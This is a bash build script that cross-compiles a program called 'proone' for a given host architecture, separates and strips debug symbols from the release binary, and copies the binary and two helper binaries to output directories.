#!/bin/bash
set -e

separate_debug() {
	cp -a "$1" "$2"
	"$PROONE_HOST-objcopy" --only-keep-debug "$2" "$3"
	"$PROONE_HOST-strip" -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr "$2"
	"$PROONE_HOST-objcopy" --add-gnu-debuglink="$3" "$2"
}

BIN_DBG="$PROONE_DEBUG_SYM_PREFIX.$PROONE_BIN_ARCH"
BIN_REL="$PROONE_REL_BIN_PREFIX.$PROONE_BIN_ARCH"

./configure --host="$PROONE_HOST" $PROONE_AM_CONF
make -j$(nproc)

separate_debug src/proone "$BIN_REL" "$BIN_DBG"
cp -a src/proone-stress "$PROONE_MISC_BIN_PREFIX/proone-stress.$PROONE_BIN_ARCH"
cp -a src/proone-arch-test "$PROONE_MISC_BIN_PREFIX/proone-arch-test.$PROONE_BIN_ARCH"

make distclean
